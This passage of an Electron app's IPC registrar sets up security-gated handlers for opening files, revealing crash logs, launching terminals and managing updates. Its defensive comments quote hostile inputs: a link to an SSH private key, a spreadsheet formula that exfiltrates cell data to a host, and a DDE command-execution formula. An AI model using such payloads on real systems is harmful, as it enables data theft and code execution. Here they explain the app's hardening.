      windows.chrome.setThemeAccent(hex));
    ipcMain.on("focus-mode-chrome", (event, visible) =>
      windows.chrome.focusMode(event.sender, visible));
    // Arm/disarm the off-window cursor poll that dismisses a focus-mode reveal.
    // A bare boolean: the window is the sender's, and the distance threshold is
    // the main process's, so the renderer names neither.
    ipcMain.on("focus-mode-watch-cursor", (event, watching) =>
      windows.chrome.watchFocusCursor(event.sender, watching));
    ipcMain.on("window-control", (event, action) =>
      windows.chrome.windowControl(event.sender, action, event.senderFrame));
    ipcMain.on("theme-mode-changed", (_event, pref) =>
      windows.chrome.setThemeMode(pref));
    ipcMain.on("titlebar-overlay-theme", (_event, mode) =>
      windows.chrome.setTitlebarMode(mode));

    // Electron no-ops setBadgeCount on unsupported platforms. Keep the clamp in
    // the trusted process so a malformed renderer value cannot set an absurd
    // badge on platforms which do support it.
    ipcMain.on("badge:set", (_event, count) => {
      app.setBadgeCount(clampBadgeCount(count));
    });

    // This setting deliberately has next-launch semantics. Toggling it never
    // starts or stops the gateway which owns the current session.
    ipcMain.handle("local-gateway:get", () => isLocalGatewayEnabled(store));
    ipcMain.handle("local-gateway:set", (_event, enabled) =>
      setLocalGatewayEnabled(store, enabled));

    // THE local-dashboard gate. Every channel whose answer is a fact about the
    // machine in front of the user — rather than about the gateway a window
    // happens to be talking to — takes all three of these, because a connection
    // window pointed at a REMOTE gateway shares this same preload.
    //
    // One function, not one copy per channel. `wsl:detect` and both
    // `crash-reports:*` channels need the identical three gates, and three
    // hand-maintained spellings of a security check are three chances for one of
    // them to be tightened while the others are not.
    //
    // All THREE gates, never two. An earlier version of this file stopped at
    // gate 2 for the crash channels, reasoning that gate 3 exists to withhold a
    // host software inventory and that this payload is only a count and a
    // timestamp. That reasoning does not survive `crash-reports:reveal`, which
    // is not a read at all: it opens a file-manager window on the machine in
    // front of the user. A manual SSH tunnel holding the primary port appears in
    // no remote-host config, so gate 2 passes for it by construction (see
    // `isGatewayLocalForWindow`, which can only consult configured hosts) — and
    // a remote renderer would then be able to pop a local Finder/Explorer
    // window and learn whether this machine has been crashing. Gate 3 is the
    // only one that positively identifies the listener.
    //
    // Every rejection is LOGGED, not silent. The UI renders a sender rejection
    // and a genuinely empty answer ("no crashes", "no WSL install") the same
    // way, so diagnostics are the only place those two causes can be told apart.
    //
    // Most callers throw the rejection through to the renderer as a hard
    // refusal. `app-menu:execute` is the exception (see its handler above): it
    // catches the throw, treats the outcome as a boolean, and uses it as a
    // PER-ACTION gate inside `executeMenuItem`. Both callers use the same
    // three gates — the difference is only what happens on rejection.
    //
    // (assertLocalDashboard is defined at createIpcRegistrar scope, above.)

    // Crash artifacts left by a previous run, so the dashboard can say "this
    // happened" instead of leaving the user to discover it themselves.

    ipcMain.handle("crash-reports:get", async (event) => {
      await assertLocalDashboard(event, "crash-reports:get");
      // Absent injection means the shell was assembled without a collector —
      // report "nothing to see" rather than failing the renderer's first call.
      return crashNoticeSummary(typeof crashScan === "function" ? crashScan() : null);
    });

    // Reveal, never read. The renderer names no path and receives no path: this
    // resolves the log location in the trusted process from the scan it already
    // performed, so the channel cannot be turned into "open an arbitrary file
    // for me". Reveals the FILE (selected in its folder) rather than opening
    // it, because the useful gesture is "hand this directory over" — the log
    // sits beside chromium.log and the retained previous generation.
    ipcMain.handle("crash-reports:reveal", async (event) => {
      await assertLocalDashboard(event, "crash-reports:reveal");
      const scan = typeof crashScan === "function" ? crashScan() : null;
      if (!scan || !scan.crashLogPath) return { ok: false, error: "no crash log" };
      try {
        shell.showItemInFolder(scan.crashLogPath);
        return { ok: true };
      } catch (e) {
        log(`crash-reports:reveal failed: ${e && e.message}`);
        return { ok: false, error: String((e && e.message) || e) };
      }
    });

    // Purge the HTTP cache of ONE remote-crew pane origin. The renderer asks for
    // this when a pane's entry `<script type=module>` fires `error` (relayed as
    // `mc-embedded-boot stage=script-error`) and again on an explicit Retry:
    // a chunk 404 the gateway once served with `Cache-Control: immutable` is
    // replayed from this cache on every load, so no tunnel rebuild, re-mint or
    // gateway restart can ever get that pane past Loading -- only evicting the
    // entry can. Scope is the pane's ORIGIN and the `cache` data type only:
    // cookies, storage and the service worker are untouched, and the shell's
    // own origin is refused (see `purgeableOrigin`). Sender-gated like every
    // other channel that acts on this machine: the same preload serves a
    // connection window pointed at a REMOTE gateway, and only the local
    // dashboard shell -- the one that frames remote panes -- may evict a
    // loopback origin's cache; `purgeableOrigin` bounds WHICH origin, the gate
    // bounds WHO asks. After the gate, resolves to whether a purge ran and
    // never throws into the renderer: the reload that follows must go ahead
    // either way.
    ipcMain.handle("pane:clear-http-cache", async (event, origin) => {
      await assertLocalDashboard(event, "pane:clear-http-cache");
      const target = purgeableOrigin(origin, backendUrl);
      if (!target) {
        log(`${PANE_ASSETS_PREFIX} clear-http-cache refused origin=${String(origin).slice(0, 128)}`);
        return false;
      }
      const ses = event && event.sender && event.sender.session;
      if (!ses || typeof ses.clearData !== "function") {
        log(`${PANE_ASSETS_PREFIX} clear-http-cache unavailable origin=${target}`);
        return false;
      }
      try {
        await ses.clearData({ origins: [target], dataTypes: ["cache"] });
        log(`${PANE_ASSETS_PREFIX} clear-http-cache origin=${target} cleared`);
        return true;
      } catch (e) {
        log(`${PANE_ASSETS_PREFIX} clear-http-cache origin=${target} failed: ${e && e.message}`);
        return false;
      }
    });

    // WSL2 host-runtime readout, rendered read-only by the Host runtime card.
    // Sender-restricted ON PURPOSE: the discovery result is a fact about THIS
    // machine, so only WebContents served by this shell's own local gateway may
    // enumerate it. Connection windows pointed at a remote gateway share this
    // preload and must get a rejection instead of the host's distro inventory.
    ipcMain.handle("wsl:detect", async (event) => {
      await assertLocalDashboard(event, "wsl:detect");
      return detectWsl();
    });

    // What the main window's close button does. Deliberately narrower than
    // `assertLocalDashboard`, which would hide the row from a main window on a
    // configured remote host and leave that user no way to change it. The
    // sender must be the main window's top frame, still on its assigned
    // dashboard origin. That trusts the main window's dashboard, local or
    // remote, with a visible, reversible two-valued preference.
    const assertMainWindowDashboard = (event, channel) => {
      const refuse = (why) => {
        log(`${channel} rejected: ${why}`);
        throw new Error(`${channel} is restricted to the main window's dashboard`);
      };
      const main = windows.getMainWindow();
      if (!main || windows.windowForWebContents(event.sender) !== main) {
        refuse("sender is not the main window");
      }
      if (!event.senderFrame || event.senderFrame !== event.sender.mainFrame) {
        refuse("sender is not the top frame");
      }
      let origin = "";
      let expected = "";
      try {
        origin = new URL(event.senderFrame.url).origin;
        expected = new URL(main._mcBackendUrl).origin;
      } catch {
        // An unreadable URL matches nothing.
      }
      if (!origin || origin !== expected) {
        refuse(`sender origin ${origin || "(unreadable)"} is not the main window's dashboard`);
      }
    };
    ipcMain.handle("close-action:get", async (event) => {
      assertMainWindowDashboard(event, "close-action:get");
      return windows.closeAction.get();
    });
    ipcMain.handle("close-action:set", async (event, value) => {
      assertMainWindowDashboard(event, "close-action:set");
      return windows.closeAction.set(value);
    });

    // Open a file the chat referenced in the user's own editor, by handing its
    // path to the OS default handler on the machine in front of them.
    //
    // Sibling to `crash-reports:reveal`, and gated the same way: this is not a
    // read, it is a LAUNCH on the local machine, so it takes the full
    // three-gate local-dashboard check. A connection window pointed at a REMOTE
    // gateway shares this preload, and must never be able to open a file on the
    // host running this shell.
    //
    // Trust nothing about the path either: the chat transcript is AGENT-authored
    // (and can carry externally-influenced content), so a hostile
    // `[open](/Users/me/.ssh/id_rsa)` must not become "launch this". Hence the
    // same validation shape the `mochi-pet:open-image` handler already uses:
    //   - realpathSync BEFORE the extension test, so a `.md` symlink to a key
    //     file is judged by what it actually resolves to;
    //   - a text/document extension allowlist — a fixed set, deliberately not
    //     user-extensible (a configurable list reopens the external-scheme
    //     surface external-scheme.js documents as rejected);
    //   - a regular-file requirement;
    //   - a non-empty `openPath` return means the OS refused; surface it rather
    //     than failing silently.
    // The chip that reaches this channel is only actionable after the gateway's
    // own /api/file-read probe has already confirmed a non-sensitive regular
    // file (is_sensitive_path), so the credential-path denylist is enforced
    // upstream; the checks here are defence in depth on the launch primitive.
    ipcMain.handle("dashboard:open-file", async (event, filePath) => {
      await assertLocalDashboard(event, "dashboard:open-file");
      if (typeof filePath !== "string" || filePath === "") {
        return { ok: false, error: "no path" };
      }
      const fs = require("fs");
      const nodePath = require("path");
      const { openPathHardened } = require("./open-path");
      // ONLY extensions whose OS default handler opens the file in a
      // PLAIN-TEXT viewer/editor and CANNOT execute the file's contents. That
      // predicate -- not a hand-kept list -- is the security bar: shell.openPath
      // launches the OS default handler and the path is agent-authored, so any
      // type whose handler can run embedded content is arbitrary code execution.
      // Four families are therefore excluded, all reachable only through this
      // affordance (the built-in viewer, which renders inert, remains for them):
      //   - interpreter/shell scripts (`.js`/`.mjs`/`.cjs` -> Windows Script Host,
      //     `.py`/`.rb` -> interpreters, `.sh`/`.ps1` -> a shell);
      //   - browser ACTIVE DOCUMENTS (`.html`/`.htm`/`.svg`/`.xml`) -- the browser
      //     opens them at a `file://` origin and EXECUTES embedded JavaScript;
      //   - RICH DOCUMENTS whose default app has a content-execution surface
      //     (`.doc`/`.docx`/`.odt` -> Word/LibreOffice VBA/macros incl. AutoOpen,
      //     `.rtf` -> Word OLE, `.pdf` -> reader JavaScript). Legacy `.doc` is the
      //     clearest case (VBA/AutoOpen), but the whole family fails the predicate;
      //     and
      //   - SPREADSHEETS (`.csv`/`.tsv`/`.xls`/`.xlsx`/`.ods`). These LOOK like
      //     plain text, and that is the trap: the extension decides the app, and
      //     the default app for them is Excel / Numbers / LibreOffice Calc, which
      //     EVALUATES any cell opening with `=`, `+`, `-` or `@` as a formula. An
      //     agent-authored `=WEBSERVICE("http://host/"&A1)` exfiltrates the sheet
      //     and `=cmd|'/c ...'!A0` reaches DDE, so the bytes are executed by the
      //     handler even though nothing about the file is a program. Judge the
      //     predicate on the app that actually opens the type, not on how the
      //     bytes read to a human.
      const OPENABLE_EXTS = new Set([
        ".md", ".markdown", ".txt", ".text", ".rst", ".org", ".log",
        ".json", ".jsonc", ".json5", ".yaml", ".yml", ".toml", ".ini", ".cfg", ".conf", ".env",
        ".css", ".graphql", ".proto",
      ]);
      try {
        // realpath BEFORE the extension test: a `.md` symlink to a key file
        // must be judged by what it actually resolves to.
        const real = fs.realpathSync(filePath);
        if (!OPENABLE_EXTS.has(nodePath.extname(real).toLowerCase())) {
          return { ok: false, error: "unsupported file type" };
        }
        if (!fs.statSync(real).isFile()) {
          return { ok: false, error: "not a file" };
        }
        // Hand the launch to the hardened wrapper, not `shell.openPath`: on
        // Linux the bare `xdg-open` name resolves against the inherited PATH,
        // so an agent-writable leading entry would shadow the launcher and turn
        // an open into arbitrary code execution. `openPathHardened` narrows PATH
        // across the native launch and is a drop-in (same `Promise<string>`,
        // empty on success) -- it hardens WHICH launcher runs, while the
        // realpath/extension/isFile checks above decide WHAT it may open.
        // Non-empty return value means the OS refused to open it.
        const err = await openPathHardened(shell, real);
        if (err) {
          log(`dashboard:open-file: OS refused ${real}: ${err}`);
          return { ok: false, error: err };
        }
        return { ok: true };
      } catch (e) {
        log(`dashboard:open-file refused: ${e && e.message}`);
        return { ok: false, error: String((e && e.message) || e) };
      }
    });

    // The OS-native folder chooser behind the project picker's "Open system
    // folder picker" button. Electron's own dialog draws it from this process,
    // so it spawns nothing and needs no sandbox allowance.
    //
    // Gated like `crash-reports:reveal`: a dialog is an action on the machine in
    // front of the user, and the folder it returns is a path on THIS machine, so
    // it is only meaningful to a window whose gateway runs here. A connection
    // window pointed at a remote gateway shares this preload and is refused.
    //
    // The renderer supplies nothing. The handler reads only the event: the
    // options are fixed here, so a page cannot choose the default path, the
    // properties (files, multi-select) or the filters. The answer is the one
    // absolute folder the user chose, or null for a cancel or a malformed
    // result; a dialog that fails to open rejects, so the picker can tell the
    // user instead of reading it as a cancel. The picker validates the path
    // through the gateway's directory listing before using it. The chosen path
    // is never logged.
    ipcMain.handle("dashboard:pick-folder", async (event) => {
      await assertLocalDashboard(event, "dashboard:pick-folder");
      if (folderPickOpen) return null;
      folderPickOpen = true;
      try {
        const owner = windows.windowForWebContents(event.sender);
        const parent = owner && !(typeof owner.isDestroyed === "function" && owner.isDestroyed())
          ? owner
          : null;
        const options = { properties: ["openDirectory"] };
        let result;
        try {
          result = parent
            ? await dialog.showOpenDialog(parent, options)
            : await dialog.showOpenDialog(options);
        } catch (e) {
          log(`dashboard:pick-folder failed: ${e && e.message}`);
          throw new Error("dashboard:pick-folder could not open the folder dialog");
        }
        if (!result || result.canceled || !Array.isArray(result.filePaths)) return null;
        const picked = result.filePaths[0];
        if (typeof picked !== "string" || !require("path").isAbsolute(picked)) return null;
        return picked;
      } finally {
        folderPickOpen = false;
      }
    });

    // Whether this window may use `dashboard:pick-folder`, so the picker shows
    // the button only where it works. Runs the same gate and answers a bare
    // boolean -- the same fact a gated channel's rejection already tells -- and
    // never opens a dialog.
    ipcMain.handle("dashboard:can-pick-folder", async (event) => {
      try {
        await assertLocalDashboard(event, "dashboard:can-pick-folder");
        return true;
      } catch {
        return false;
      }
    });

    // First-run setup's "connect to a crew on another machine" exit. It stops the
    // gateway this app started and reconnects the main window to a crew the
    // user names, so it is an action on the machine in front of the user and
    // takes the full three-gate check. The supervisor then decides from its own
    // state whether that window may switch: the main window only, on a gateway
    // this app spawned. The renderer supplies nothing either way.
    //
    // `can-...` answers a bare boolean so setup shows the link only where the
    // switch works, and never opens the form.
    ipcMain.handle("first-run:can-use-remote-crew", async (event) => {
      try {
        await assertLocalDashboard(event, "first-run:can-use-remote-crew");
      } catch {
        return false;
      }
      return gateway.canSwitchToRemoteCrew(windows.windowForWebContents(event.sender)) === true;
    });
    ipcMain.handle("first-run:use-remote-crew", async (event) => {
      await assertLocalDashboard(event, "first-run:use-remote-crew");
      return gateway.switchToRemoteCrew(windows.windowForWebContents(event.sender));
    });

    // Open the user's own terminal app in a project directory. Gated like
    // `dashboard:open-file` because it is a LAUNCH on the machine in front of
    // the user, and a connection window pointed at a remote gateway shares this
    // preload.
    //
    // `detect` lists the allowlisted apps installed here, for the Settings
    // picker; the pick itself is gateway config. `open` takes the opaque grant
    // the gateway minted after its own checks (owner, direct-local request,
    // integrated terminal enabled, an app picked) and starts nothing unless the
    // gateway redeems it. The app id and the directory come from that
    // redemption, the binary and argv from the allowlist in
    // external-terminal.js, and no OS opener is involved at any step.
    //
    // `detect` answers a refused window `{ apps: [], capable: false }` instead
    // of rejecting, as `dashboard:can-pick-folder` answers false: a desktop
    // window reaching a remote crew through an SSH tunnel is an ordinary
    // window that can never launch here, not a failed check, so the renderer
    // hides the row and the picker rather than reporting an error a Retry
    // cannot clear. The gate still runs (and logs) before any probe, so a
    // refused window learns only this one bit, and `open` keeps rejecting.
    ipcMain.handle("external-terminal:detect", async (event) => {
      try {
        await assertLocalDashboard(event, "external-terminal:detect");
      } catch {
        return { apps: [], capable: false };
      }
      return { apps: externalTerminal.detectTerminals(), capable: true };
    });
    ipcMain.handle("external-terminal:open", async (event, grant) => {
      await assertLocalDashboard(event, "external-terminal:open");
      return externalTerminal.launchFromGrant(grant, {
        backendUrl,
        getSecret: () => readInternalSecret(backendUrl),
        fetchFn,
        log,
      });
    });

    ipcMain.handle("zoom:get", (event) =>
      windows.chrome.getZoom(event.sender));
    ipcMain.handle("zoom:set", (event, factor) =>
      windows.chrome.setZoom(event.sender, factor));
    ipcMain.handle("zoom:step", (event, direction) =>
      windows.chrome.stepZoom(event.sender, direction));

    // The window façade resolves every request from event.sender and keeps the
    // native panel/control-plane internals private to that owning window.
    ipcMain.handle("browser:open", (event, panelId, url) =>
      windows.browser.open(event.sender, panelId, url));
    ipcMain.handle("browser:navigate", (event, panelId, url) =>
      windows.browser.navigate(event.sender, panelId, url));
    ipcMain.handle("browser:set-bounds", (event, panelId, rect, viewport) =>
      windows.browser.setBounds(event.sender, panelId, rect, viewport));
    ipcMain.handle("browser:set-overlay", (event, panelId, active) =>
      windows.browser.setOverlay(event.sender, panelId, active));
    ipcMain.handle("browser:set-inactive", (event, panelId, value) =>
      windows.browser.setInactive(event.sender, panelId, value));
    ipcMain.handle("browser:close", (event, panelId) =>
      windows.browser.close(event.sender, panelId));
    ipcMain.handle("browser:get-state", (event, panelId) =>
      windows.browser.getState(event.sender, panelId));
    ipcMain.handle("browser:track-session", (event, panelId, tracked) =>
      windows.browser.trackSession(event.sender, panelId, tracked));
    ipcMain.handle("browser:set-agent-act", (event, panelId, enabled) =>
      windows.browser.setAgentAct(event.sender, panelId, enabled));
    ipcMain.handle("browser:set-control-owner", (event, panelId, requested) =>
      windows.browser.setControlOwner(event.sender, panelId, requested));
    ipcMain.handle("browser:get-control", (event, panelId) =>
      windows.browser.getControl(event.sender, panelId));
    // Deliberately remains a closed verb dispatcher inside window-lifecycle;
    // this bridge never exposes a raw CDP method to the renderer.
    ipcMain.handle("browser:control", (event, panelId, op, args) =>
      windows.browser.control(event.sender, panelId, op, args));
    // Element annotation on the native page (human-initiated; closed op set,
    // not a control op -- it takes no agent ownership of the view).
    ipcMain.handle("browser:annotate", (event, panelId, op, args) =>
      windows.browser.annotate(event.sender, panelId, op, args));

    ipcMain.on("mic:denied", () => windows.security.micDenied());

    // Diagnostics accept only the sender identity and payload. The window
    // owner enforces the primary-renderer attribution rule before buffering.
    ipcMain.on("memory-sample", (event, payload) =>
      windows.diagnostics.memorySample(event.sender, payload));

    shellRegistered = true;
    return summonDashboard;
  }

  /**
   * Bind only after createMainWindow(). Binding earlier lets a keypress during
   * boot race window creation and produce a second dashboard.
   */
  function bindGlobalHotkey() {
    return bindStoredGlobalHotkey(store.get("globalHotkey"), summonDashboard);
  }

  function broadcastUpdateState(payload) {
    // Include the main-process governance verdict in every state update so
    // the renderer can distinguish a local bundled gateway (governed) from
    // a remote one connected via SSH (not governed here, regardless of stamp).
    const enriched = { ...payload, policyGoverned };
    try {
      for (const contents of webContents.getAllWebContents()) {
        if (!contents.isDestroyed()) {
          try {
            contents.send("update-state", enriched);
          } catch {
            // The view disappeared between enumeration and dispatch.
          }
        }
      }
    } catch {
      // Updating is auxiliary; an unavailable WebContents registry is benign.
    }
  }

  /**
   * Initialize auto-update and register update:* IPC.
   *
   * Call this after the main window exists but BEFORE awaiting gateway.start()
   * or gateway.connect(). preload exposes updateAPI immediately, so a slow or
   * failed boot must not leave a visible button with no IPC handler behind it.
   */
  function registerUpdater() {
    if (updaterRegistered) return updater;

    // FAIL-OPEN: updater initialization is auxiliary and must never gate the
    // gateway. Because this runs before the awaited boot, any thrown require,
    // feed parse, or updater construction error is converted to a disabled
    // handle; all update:* handlers still register against that handle.
    try {
      updater = initAutoUpdate({
        app,
        // electron-updater's AppUpdater, NOT Electron's built-in autoUpdater:
        // it generates/verifies feed metadata and also supports Linux.
        autoUpdater: require("electron-updater").autoUpdater,
        isPolicyGoverned: () => policyGoverned,
        // On Windows, 'session-end' fires on BaseWindow (not App). The feed
        // lane uses this to register its pending-update notice on the window.
        getMainWindow: () => windows.getMainWindow(),
        dialog: electron.dialog,
        Notification,
        getFlavor: () => "stable",
        getChannelPreference: () => store.get("updateChannel", ""),
        getRequiredChannel,
        getAutoDownloadPreference: () =>
          store.get("autoDownloadUpdates", true) !== false,
        notifyUpdateFound: (version, { autoDownload = false } = {}) => {
          if (!version || store.get("lastNudgedVersion", "") === version) return;
          store.set("lastNudgedVersion", version);
          try {
            const notification = new Notification({
              title: `${app.name} update available`,
              body: autoDownload
                ? `Version ${version} is downloading and will install the next time you quit. `
                  + "Manage in Settings > About."
                : `Version ${version} is ready. Open Settings > About to download and install.`,
            });
            notification.on("click", () => {
              // Reveal through the façade so a pending fullscreen/tray hide is
              // cancelled before restore/show/focus; otherwise the click can
              // appear to work and then immediately hide the window again.
              windows.showMainWindow({ focus: true });
            });
            notification.show();
          } catch {
            // Native notifications are optional; discovery still succeeds.
          }
        },
        stopGateway: () => gateway.stopForUpdate(),
        // WHY this hook precedes stopGateway: it closes the watchdog race before
        // the intentional shutdown and disarms probing throughout bundle swap.
        // auto-update invokes onInstallDispatched before awaiting stopGateway;
        // keep these as separate callbacks so that ordering remains explicit.
        // Closing the companion overlay here — before the gateway stops — keeps a
        // reconcile tick from reopening it in the window where it is still up.
        onInstallDispatched: () => {
          gateway.onInstallDispatched();
          closeCrewCompanionForUpdate();
        },
        // WHY failure recovery is active: dispatch stopped both the watchdog and
        // gateway. A failed swap does not quit, so nothing else can restore the
        // dashboard; the supervisor clears the flag, respawns, reconnects, and
        // re-arms liveness in that order. The companion closed at dispatch is
        // reopened to match — its loop self-heals once the restored gateway answers.
        onInstallFailed: () => {
          gateway.onInstallFailed();
          reopenCrewCompanionAfterUpdate();
        },
        onUpdateState: broadcastUpdateState,
        log: makeUpdaterLogger(log),
      });
    } catch (error) {
      log(
        "auto-update init failed — continuing WITHOUT auto-update: "
        + ((error && error.stack) || error),
      );
      updater = {
        check: () => {},
        download: async () => {},
        install: async () => {},
        getInfo: () => ({
          version: app.getVersion(),
          packaged: !!app.isPackaged,
        }),
        disabled: "init-failed",
      };
    }

    // disabled is a sibling on every updater handle, not part of getInfo().
    // Merge it once so Settings > About can render why updates are unavailable.
    const updaterInfo = () => ({
      ...updater.getInfo(),
      disabled: updater.disabled,
      policyGoverned,
    });

    // One-way notification from the renderer: the gateway status reported that
    // a security policy provider governs this install's updates. The feed lane
    // stands down until notified the opposite. Fire-and-forget: no response
    // expected; the lane reads policyGoverned on its next scheduled check.
    //
    // Three-gate guard (assertLocalDashboard): origin, window-locality, and
    // port-owner proof. The `lsof` binary is required on Linux for gate 3;
    // it is declared as a Debian package dependency in electron/package.json.
    ipcMain.on("update:notify-policy-governed", async (_event, governed) => {
      const srcId = _event?.sender?.id ?? null;
      // Per-sender sequence: bump before awaiting so if a later notification
      // from the same sender completes the probe first, this older continuation
      // is discarded and does not overwrite the newer verdict.
      const mySeq = (senderSeq.get(srcId) ?? 0) + 1;
      senderSeq.set(srcId, mySeq);

      // Three-gate check via the shared assertLocalDashboard helper.
      try {
        await assertLocalDashboard(_event, "update:notify-policy-governed");
      } catch {
        return;
      }
      // Gate 4 — current-bundle ownership (governance handler only).
      // A second copy of the app can also hold the port as "kirocrew"; its
      // policy provider would incorrectly suppress this copy's updater.
      // Unlike assertLocalDashboard's three gates which apply to every shell
      // channel, this check is only relevant for governance, and
      // isCurrentBundleGateway returns false on Windows/dev so must not
      // run for other channels. Skip when the function is unavailable.
      if (typeof gateway.isCurrentBundleGateway === "function") {
        let isCurrentBundle = false;
        try {
          isCurrentBundle = await gateway.isCurrentBundleGateway();
        } catch { /* probe failed — fail closed */ }
        if (!isCurrentBundle) {
          log("update:notify-policy-governed ignored: running gateway belongs to a different bundle");
          return;
        }
      }
      // Reject senders that were destroyed while the probe was awaited.
      // If the window closed during assertLocalDashboard's async port probe,
      // the srcId must not be added to governanceSenders: the destroyed event
      // already fired before the add, so no cleanup listener will fire.
      if (_event?.sender?.isDestroyed?.()) {
        log("update:notify-policy-governed: sender destroyed during probe — rejecting");
        return;
      }
      // Discard if a newer notification from the same sender already landed.
      if (senderSeq.get(srcId) !== mySeq) {
        log("update:notify-policy-governed: superseded notification discarded");
        return;
      }
      const prev = policyGoverned;
      if (governed) {
        if (srcId !== null) {
          governanceSenders.add(srcId);
          // Remove from the set when the window is destroyed so governance is
          // lifted automatically once all governing windows close.
          // Uses the captured srcId (not a live sender reference) because the
          // sender object is gone by the time destroyed fires.
          if (_event?.sender) {
            _event.sender.once("destroyed", () => {
              governanceSenders.delete(srcId);
              // On macOS the app stays alive after all windows close
              // (Cmd+W vs Cmd+Q). If this was the last window, do not clear
              // governance: the user may reopen a window and the governance
              // state re-sent by the new window's hook will re-establish it.
              // On other platforms the app exits when the last window closes,
              // so clearing is safe. Only clear when another window is open
              // or we're not on macOS.
              const { BrowserWindow } = electron;
              const anyOpen = BrowserWindow && BrowserWindow.getAllWindows().length > 0;
              if (anyOpen || process.platform !== "darwin") {
                const wasGoverned = policyGoverned;
                policyGoverned = governanceSenders.size > 0;
                // Broadcast the cleared verdict to any remaining windows so
                // their useIsPolicyGoverned can stop treating the old
                // update-state cache value as authoritative (same as the
                // explicit-false path).
                if (wasGoverned && !policyGoverned) {
                  updater?.check?.();
                }
              }
            });
          }
        }
        policyGoverned = srcId !== null ? governanceSenders.size > 0 : true;
        if (!prev) {
          // Governance just became active: trigger a check immediately so the
          // feed lane emits not-available and clears any stale "found" state.
          updater?.check?.();
        }
      } else {
        // Lift governance for this sender. Other windows may still be governed.
        if (srcId !== null) governanceSenders.delete(srcId);
        else governanceSenders.clear();
        policyGoverned = governanceSenders.size > 0;
        // On a true-to-false transition: broadcast the cleared verdict by
        // triggering a check so the renderer's update-state cache updates
        // (useIsPolicyGoverned reads policyGoverned from the broadcast).
        if (prev && !policyGoverned) {
          updater?.check?.();
        }
      }
    });
    ipcMain.handle("update:get-info", () => updaterInfo());
    ipcMain.handle("update:check", () => {
      updater.check();
      return { ok: true };
    });
    ipcMain.handle("update:download", () => {
      updater.download();
      return { ok: true };
    });
    ipcMain.handle("update:install", async () => {
      await updater.install();
      return { ok: true };
    });
    ipcMain.handle("update:set-channel", (_event, channel) => {
      const next = typeof channel === "string" ? channel : "";
      if (next !== "" && next !== "insider" && next !== "stable") {
        return { ok: false, error: `invalid channel: ${next}` };
      }
      // A required channel replaces the preference, so storing another one
      // would be a switch that does nothing. The dashboard's
      // POST /api/update/channel answers the same way (409 locked_by_policy).
      const required = getRequiredChannel();
      if (required && next !== required) {
        return {
          ok: false,
          code: "locked_by_policy",
          error: `updates follow the ${required} channel set by your organization's policy`,
          info: updaterInfo(),
        };
      }
      store.set("updateChannel", next);
      updater.check();
      return { ok: true, info: updaterInfo() };
    });
    ipcMain.handle("update:set-auto-download", (_event, enabled) => {
      if (typeof enabled !== "boolean") {
        return { ok: false, error: `invalid value: ${typeof enabled}` };
      }
      store.set("autoDownloadUpdates", enabled);
      if (enabled) updater.check();
      return { ok: true, info: updaterInfo() };
    });

    updaterRegistered = true;
    return updater;
  }

  return Object.freeze({
    registerShell,
    bindGlobalHotkey,
    unregisterGlobalHotkey,
    registerUpdater,
    summonDashboard,
  });
}

module.exports = { createIpcRegistrar };
